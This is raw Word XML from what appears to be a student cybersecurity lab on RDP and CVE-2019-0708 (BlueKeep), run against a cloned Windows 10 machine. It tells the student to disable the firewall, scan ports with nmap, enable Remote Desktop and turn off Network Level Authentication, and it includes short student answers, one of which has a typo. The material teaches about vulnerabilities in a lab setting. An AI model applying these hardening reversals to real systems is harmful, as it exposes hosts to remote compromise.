      <w:r w:rsidR="005D50C2">
        <w:t xml:space="preserve">and vice versa. Make sure firewall settings are disabled. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B92D87" w14:textId="6254F1D9" w:rsidR="004A0179" w:rsidRDefault="004A0179" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidRPr="004A0179">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="00650FEE">
        <w:t xml:space="preserve">scan open ports for </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Windows 10 Clone machine. </w:t>
      </w:r>
      <w:r w:rsidRPr="004A0179">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Attach screen capture to demo results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCEECDE" w14:textId="66D0AC2C" w:rsidR="008E5FF4" w:rsidRPr="004A0179" w:rsidRDefault="008E5FF4" w:rsidP="008E5FF4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B3213C0" wp14:editId="63D112F2">
            <wp:extent cx="5724525" cy="2447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14:paraId="3FD9B9E0" w14:textId="6E6A0127" w:rsidR="00A353F5" w:rsidRDefault="00A353F5" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>What is the purpose of RDP protocol and what is the default port number used by this protocol?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BB27F5" w14:textId="1E740F37" w:rsidR="008E5FF4" w:rsidRPr="008E5FF4" w:rsidRDefault="008E5FF4" w:rsidP="008E5FF4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>The Remote Desktop Protocol is used in windows OS for a user to use a GUI when connecting to a machine remotely. It uses the default port RCP 3389</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73602C74" w14:textId="0AFD3948" w:rsidR="00A353F5" w:rsidRDefault="00A353F5" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Why is this protocol </w:t>
      </w:r>
      <w:r w:rsidR="002C4154">
        <w:t xml:space="preserve">(RDP) </w:t>
      </w:r>
      <w:r>
        <w:t>vulnerable?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8B485D" w14:textId="1027583B" w:rsidR="00AB233D" w:rsidRDefault="00FF1740" w:rsidP="00AB233D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Unrestricted port access as it is almost always using the default port of 3389</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507080D0" w14:textId="19EA2067" w:rsidR="00CF1757" w:rsidRPr="00AB233D" w:rsidRDefault="00CF1757" w:rsidP="00AB233D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Often allows unauthenticated users to access </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E9CE68" w14:textId="7D5686D0" w:rsidR="00615B91" w:rsidRDefault="00603590" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use National Vulnerability Databases (NVD) and search for vulnerability CVE-2019-0708. Provide the description and severity </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7EC4B5" w14:textId="296295E9" w:rsidR="00CF1757" w:rsidRDefault="00CF1757" w:rsidP="00CF1757">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>A Remote Code Execution vulnerability that allows attackers to connect to a machine through RDP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461DD842" w14:textId="17BB44A8" w:rsidR="000417AB" w:rsidRPr="00CF1757" w:rsidRDefault="000417AB" w:rsidP="00CF1757">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>9.8 CRITICAL severity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020A54E8" w14:textId="77A08561" w:rsidR="00A353F5" w:rsidRDefault="00A353F5" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Use nmap to verify the state of this port in Windows 10 Clone machine. Attach a screen capture to demo results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6429CADB" w14:textId="0F091BAC" w:rsidR="006452FB" w:rsidRDefault="006452FB" w:rsidP="006452FB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7CA06F7A" wp14:editId="632B4BD5">
            <wp:extent cx="5705475" cy="1819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5475" cy="1819275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B7E417" w14:textId="6873CB76" w:rsidR="00A353F5" w:rsidRDefault="00A353F5" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> If</w:t>
      </w:r>
      <w:r w:rsidR="000B06C0">
        <w:t xml:space="preserve"> the port is closed. Enable RDP </w:t>
      </w:r>
      <w:r>
        <w:t>protocol by doing the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A1E7CD" w14:textId="7F95B856" w:rsidR="00A353F5" w:rsidRDefault="00A353F5" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click on settings </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="000B06C0">
        <w:t xml:space="preserve"> S</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ystem </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Remote Desktop</w:t>
      </w:r>
      <w:r w:rsidR="000B06C0">
        <w:t xml:space="preserve"> and Enable Remote Desktop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08962EB4" w14:textId="29E00B5B" w:rsidR="000B06C0" w:rsidRDefault="000B06C0" w:rsidP="000B06C0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659776" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="132063A0" wp14:editId="6BE26BEA">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2533650</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3125470</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1066800" cy="981075"/>
                <wp:effectExtent l="0" t="38100" r="57150" b="28575"/>
                <wp:wrapNone/>
                <wp:docPr id="2" name="Straight Arrow Connector 2"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="1066800"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A44D3E" id="_x0000_t32" coordsize="21600,21600" o:spt="32" o:oned="t" path="m,l21600,21600e" filled="f">
                <v:path arrowok="t" fillok="f" o:connecttype="none"/>
                <o:lock v:ext="edit" shapetype="t"/>
              </v:shapetype>
              <v:shape id="Straight Arrow Connector 2" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:199.5pt;margin-top:246.1pt;width:84pt;height:77.25pt;flip:y;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" strokecolor="#4579b8 [3044]">
                <v:stroke endarrow="block"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7268507E" wp14:editId="568277E4">
            <wp:extent cx="5934075" cy="3990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inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D33067" w14:textId="00AE0786" w:rsidR="004B37AE" w:rsidRDefault="000B06C0" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click on Advanced settings  </w:t>
      </w:r>
      <w:r w:rsidR="004B37AE">
        <w:t>to disable Network Level Authentication</w:t>
      </w:r>
      <w:r w:rsidR="00B166C3">
        <w:t xml:space="preserve"> (uncheck the box)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5F61A1" w14:textId="750C2EFF" w:rsidR="004B37AE" w:rsidRDefault="00B166C3" w:rsidP="004B37AE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660800" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6F73D396" wp14:editId="2BC6B22C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>438150</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>935355</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="895350" cy="638175"/>
                <wp:effectExtent l="0" t="0" r="19050" b="28575"/>
                <wp:wrapNone/>
                <wp:docPr id="23" name="Freeform 23"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="895350" cy="638175"/>
                        </a:xfrm>
                        <a:custGeom>
                          <a:avLst/>
                          <a:gdLst>
                            <a:gd name="connsiteX0" fmla="*/ 447675 w 895350"/>
                            <a:gd name="connsiteY0" fmla="*/ 76200 h 638175"/>
                            <a:gd name="connsiteX1" fmla="*/ 285750 w 895350"/>
                            <a:gd name="connsiteY1" fmla="*/ 85725 h 638175"/>
                            <a:gd name="connsiteX2" fmla="*/ 257175 w 895350"/>
                            <a:gd name="connsiteY2" fmla="*/ 95250 h 638175"/>
                            <a:gd name="connsiteX3" fmla="*/ 180975 w 895350"/>
                            <a:gd name="connsiteY3" fmla="*/ 114300 h 638175"/>
                            <a:gd name="connsiteX4" fmla="*/ 123825 w 895350"/>
                            <a:gd name="connsiteY4" fmla="*/ 152400 h 638175"/>
                            <a:gd name="connsiteX5" fmla="*/ 95250 w 895350"/>
                            <a:gd name="connsiteY5" fmla="*/ 161925 h 638175"/>
                            <a:gd name="connsiteX6" fmla="*/ 38100 w 895350"/>
                            <a:gd name="connsiteY6" fmla="*/ 200025 h 638175"/>
                            <a:gd name="connsiteX7" fmla="*/ 19050 w 895350"/>
                            <a:gd name="connsiteY7" fmla="*/ 228600 h 638175"/>
                            <a:gd name="connsiteX8" fmla="*/ 9525 w 895350"/>
                            <a:gd name="connsiteY8" fmla="*/ 266700 h 638175"/>
                            <a:gd name="connsiteX9" fmla="*/ 0 w 895350"/>
                            <a:gd name="connsiteY9" fmla="*/ 295275 h 638175"/>
                            <a:gd name="connsiteX10" fmla="*/ 9525 w 895350"/>
                            <a:gd name="connsiteY10" fmla="*/ 419100 h 638175"/>
                            <a:gd name="connsiteX11" fmla="*/ 19050 w 895350"/>
                            <a:gd name="connsiteY11" fmla="*/ 447675 h 638175"/>
                            <a:gd name="connsiteX12" fmla="*/ 76200 w 895350"/>
                            <a:gd name="connsiteY12" fmla="*/ 476250 h 638175"/>
                            <a:gd name="connsiteX13" fmla="*/ 133350 w 895350"/>
                            <a:gd name="connsiteY13" fmla="*/ 514350 h 638175"/>
                            <a:gd name="connsiteX14" fmla="*/ 171450 w 895350"/>
                            <a:gd name="connsiteY14" fmla="*/ 542925 h 638175"/>
                            <a:gd name="connsiteX15" fmla="*/ 209550 w 895350"/>
                            <a:gd name="connsiteY15" fmla="*/ 552450 h 638175"/>
                            <a:gd name="connsiteX16" fmla="*/ 247650 w 895350"/>
                            <a:gd name="connsiteY16" fmla="*/ 571500 h 638175"/>
                            <a:gd name="connsiteX17" fmla="*/ 276225 w 895350"/>
                            <a:gd name="connsiteY17" fmla="*/ 590550 h 638175"/>
                            <a:gd name="connsiteX18" fmla="*/ 323850 w 895350"/>
                            <a:gd name="connsiteY18" fmla="*/ 609600 h 638175"/>
                            <a:gd name="connsiteX19" fmla="*/ 390525 w 895350"/>
                            <a:gd name="connsiteY19" fmla="*/ 638175 h 638175"/>
                            <a:gd name="connsiteX20" fmla="*/ 609600 w 895350"/>
                            <a:gd name="connsiteY20" fmla="*/ 628650 h 638175"/>
                            <a:gd name="connsiteX21" fmla="*/ 638175 w 895350"/>
                            <a:gd name="connsiteY21" fmla="*/ 609600 h 638175"/>
                            <a:gd name="connsiteX22" fmla="*/ 676275 w 895350"/>
                            <a:gd name="connsiteY22" fmla="*/ 581025 h 638175"/>
                            <a:gd name="connsiteX23" fmla="*/ 742950 w 895350"/>
                            <a:gd name="connsiteY23" fmla="*/ 561975 h 638175"/>
                            <a:gd name="connsiteX24" fmla="*/ 819150 w 895350"/>
                            <a:gd name="connsiteY24" fmla="*/ 514350 h 638175"/>
                            <a:gd name="connsiteX25" fmla="*/ 847725 w 895350"/>
                            <a:gd name="connsiteY25" fmla="*/ 485775 h 638175"/>
                            <a:gd name="connsiteX26" fmla="*/ 866775 w 895350"/>
                            <a:gd name="connsiteY26" fmla="*/ 457200 h 638175"/>
                            <a:gd name="connsiteX27" fmla="*/ 876300 w 895350"/>
                            <a:gd name="connsiteY27" fmla="*/ 419100 h 638175"/>
                            <a:gd name="connsiteX28" fmla="*/ 885825 w 895350"/>
                            <a:gd name="connsiteY28" fmla="*/ 390525 h 638175"/>
                            <a:gd name="connsiteX29" fmla="*/ 895350 w 895350"/>
                            <a:gd name="connsiteY29" fmla="*/ 342900 h 638175"/>
                            <a:gd name="connsiteX30" fmla="*/ 885825 w 895350"/>
                            <a:gd name="connsiteY30" fmla="*/ 200025 h 638175"/>
                            <a:gd name="connsiteX31" fmla="*/ 876300 w 895350"/>
                            <a:gd name="connsiteY31" fmla="*/ 152400 h 638175"/>
                            <a:gd name="connsiteX32" fmla="*/ 838200 w 895350"/>
                            <a:gd name="connsiteY32" fmla="*/ 76200 h 638175"/>
                            <a:gd name="connsiteX33" fmla="*/ 781050 w 895350"/>
                            <a:gd name="connsiteY33" fmla="*/ 38100 h 638175"/>
                            <a:gd name="connsiteX34" fmla="*/ 695325 w 895350"/>
                            <a:gd name="connsiteY34" fmla="*/ 19050 h 638175"/>
                            <a:gd name="connsiteX35" fmla="*/ 666750 w 895350"/>
                            <a:gd name="connsiteY35" fmla="*/ 9525 h 638175"/>
                            <a:gd name="connsiteX36" fmla="*/ 619125 w 895350"/>
                            <a:gd name="connsiteY36" fmla="*/ 0 h 638175"/>
                            <a:gd name="connsiteX37" fmla="*/ 457200 w 895350"/>
                            <a:gd name="connsiteY37" fmla="*/ 9525 h 638175"/>
                            <a:gd name="connsiteX38" fmla="*/ 428625 w 895350"/>
                            <a:gd name="connsiteY38" fmla="*/ 19050 h 638175"/>
                            <a:gd name="connsiteX39" fmla="*/ 371475 w 895350"/>
                            <a:gd name="connsiteY39" fmla="*/ 66675 h 638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895350" h="638175">
                              <a:moveTo>
                                <a:pt x="447675" y="76200"/>
                              </a:moveTo>
                              <a:cubicBezTo>
                                <a:pt x="393700" y="79375"/>
                                <a:pt x="339550" y="80345"/>
                                <a:pt x="285750" y="85725"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="275760" y="86724"/>
                                <a:pt x="266915" y="92815"/>
                                <a:pt x="257175" y="95250"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="241821" y="99088"/>
                                <a:pt x="198789" y="104403"/>
                                <a:pt x="180975" y="114300"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="160961" y="125419"/>
                                <a:pt x="145545" y="145160"/>
                                <a:pt x="123825" y="152400"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="114300" y="155575"/>
                                <a:pt x="104027" y="157049"/>
                                <a:pt x="95250" y="161925"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="75236" y="173044"/>
                                <a:pt x="38100" y="200025"/>
                                <a:pt x="38100" y="200025"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="31750" y="209550"/>
                                <a:pt x="23559" y="218078"/>
                                <a:pt x="19050" y="228600"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="13893" y="240632"/>
                                <a:pt x="13121" y="254113"/>
                                <a:pt x="9525" y="266700"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="6767" y="276354"/>
                                <a:pt x="3175" y="285750"/>
                                <a:pt x="0" y="295275"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="3175" y="336550"/>
                                <a:pt x="4390" y="378023"/>
                                <a:pt x="9525" y="419100"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="10770" y="429063"/>
                                <a:pt x="12778" y="439835"/>
                                <a:pt x="19050" y="447675"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="39347" y="473046"/>
                                <a:pt x="51352" y="462446"/>
                                <a:pt x="76200" y="476250"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="96214" y="487369"/>
                                <a:pt x="115034" y="500613"/>
                                <a:pt x="133350" y="514350"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="146050" y="523875"/>
                                <a:pt x="157251" y="535825"/>
                                <a:pt x="171450" y="542925"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="183159" y="548779"/>
                                <a:pt x="197293" y="547853"/>
                                <a:pt x="209550" y="552450"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="222845" y="557436"/>
                                <a:pt x="235322" y="564455"/>
                                <a:pt x="247650" y="571500"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="257589" y="577180"/>
                                <a:pt x="265986" y="585430"/>
                                <a:pt x="276225" y="590550"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="291518" y="598196"/>
                                <a:pt x="308557" y="601954"/>
                                <a:pt x="323850" y="609600"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="389629" y="642489"/>
                                <a:pt x="311231" y="618351"/>
                                <a:pt x="390525" y="638175"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="463550" y="635000"/>
                                <a:pt x="536988" y="637028"/>
                                <a:pt x="609600" y="628650"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="620972" y="627338"/>
                                <a:pt x="628860" y="616254"/>
                                <a:pt x="638175" y="609600"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="651093" y="600373"/>
                                <a:pt x="661823" y="587594"/>
                                <a:pt x="676275" y="581025"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="697318" y="571460"/>
                                <a:pt x="721227" y="569874"/>
                                <a:pt x="742950" y="561975"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="771194" y="551705"/>
                                <a:pt x="796585" y="533691"/>
                                <a:pt x="819150" y="514350"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="829377" y="505584"/>
                                <a:pt x="839101" y="496123"/>
                                <a:pt x="847725" y="485775"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="855054" y="476981"/>
                                <a:pt x="860425" y="466725"/>
                                <a:pt x="866775" y="457200"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="869950" y="444500"/>
                                <a:pt x="872704" y="431687"/>
                                <a:pt x="876300" y="419100"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="879058" y="409446"/>
                                <a:pt x="883390" y="400265"/>
                                <a:pt x="885825" y="390525"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="889752" y="374819"/>
                                <a:pt x="892175" y="358775"/>
                                <a:pt x="895350" y="342900"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="892175" y="295275"/>
                                <a:pt x="890574" y="247519"/>
                                <a:pt x="885825" y="200025"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="884214" y="183916"/>
                                <a:pt x="882112" y="167510"/>
                                <a:pt x="876300" y="152400"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="866106" y="125895"/>
                                <a:pt x="861829" y="91952"/>
                                <a:pt x="838200" y="76200"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="819150" y="63500"/>
                                <a:pt x="802770" y="45340"/>
                                <a:pt x="781050" y="38100"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="716724" y="16658"/>
                                <a:pt x="795905" y="41401"/>
                                <a:pt x="695325" y="19050"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="685524" y="16872"/>
                                <a:pt x="676490" y="11960"/>
                                <a:pt x="666750" y="9525"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="651044" y="5598"/>
                                <a:pt x="635000" y="3175"/>
                                <a:pt x="619125" y="0"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="565150" y="3175"/>
                                <a:pt x="511000" y="4145"/>
                                <a:pt x="457200" y="9525"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="447210" y="10524"/>
                                <a:pt x="437402" y="14174"/>
                                <a:pt x="428625" y="19050"/>
                              </a:cubicBezTo>
                              <a:cubicBezTo>
                                <a:pt x="368833" y="52268"/>
                                <a:pt x="371475" y="35176"/>
                                <a:pt x="371475" y="666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4B4C6B" id="Freeform 23" o:spid="_x0000_s1026" style="position:absolute;margin-left:34.5pt;margin-top:73.65pt;width:70.5pt;height:50.25pt;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895350,63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" path="m447675,76200v-53975,3175,-108125,4145,-161925,9525c275760,86724,266915,92815,257175,95250v-15354,3838,-58386,9153,-76200,19050c160961,125419,145545,145160,123825,152400v-9525,3175,-19798,4649,-28575,9525c75236,173044,38100,200025,38100,200025v-6350,9525,-14541,18053,-19050,28575c13893,240632,13121,254113,9525,266700,6767,276354,3175,285750,,295275v3175,41275,4390,82748,9525,123825c10770,429063,12778,439835,19050,447675v20297,25371,32302,14771,57150,28575c96214,487369,115034,500613,133350,514350v12700,9525,23901,21475,38100,28575c183159,548779,197293,547853,209550,552450v13295,4986,25772,12005,38100,19050c257589,577180,265986,585430,276225,590550v15293,7646,32332,11404,47625,19050c389629,642489,311231,618351,390525,638175v73025,-3175,146463,-1147,219075,-9525c620972,627338,628860,616254,638175,609600v12918,-9227,23648,-22006,38100,-28575c697318,571460,721227,569874,742950,561975v28244,-10270,53635,-28284,76200,-47625c829377,505584,839101,496123,847725,485775v7329,-8794,12700,-19050,19050,-28575c869950,444500,872704,431687,876300,419100v2758,-9654,7090,-18835,9525,-28575c889752,374819,892175,358775,895350,342900v-3175,-47625,-4776,-95381,-9525,-142875c884214,183916,882112,167510,876300,152400,866106,125895,861829,91952,838200,76200,819150,63500,802770,45340,781050,38100,716724,16658,795905,41401,695325,19050,685524,16872,676490,11960,666750,9525,651044,5598,635000,3175,619125,,565150,3175,511000,4145,457200,9525v-9990,999,-19798,4649,-28575,9525c368833,52268,371475,35176,371475,66675e" filled="f" strokecolor="#243f60 [1604]" strokeweight="2pt">
                <v:path arrowok="t" o:connecttype="custom" o:connectlocs="447675,76200;285750,85725;257175,95250;180975,114300;123825,152400;95250,161925;38100,200025;19050,228600;9525,266700;0,295275;9525,419100;19050,447675;76200,476250;133350,514350;171450,542925;209550,552450;247650,571500;276225,590550;323850,609600;390525,638175;609600,628650;638175,609600;676275,581025;742950,561975;819150,514350;847725,485775;866775,457200;876300,419100;885825,390525;895350,342900;885825,200025;876300,152400;838200,76200;781050,38100;695325,19050;666750,9525;619125,0;457200,9525;428625,19050;371475,66675" o:connectangles="0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="004B37AE" w:rsidRPr="004B37AE">
        <w:rPr>
          <w:noProof/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="36D13343" wp14:editId="0B3A8F12">
            <wp:extent cx="5343525" cy="4591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3525" cy="4591050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
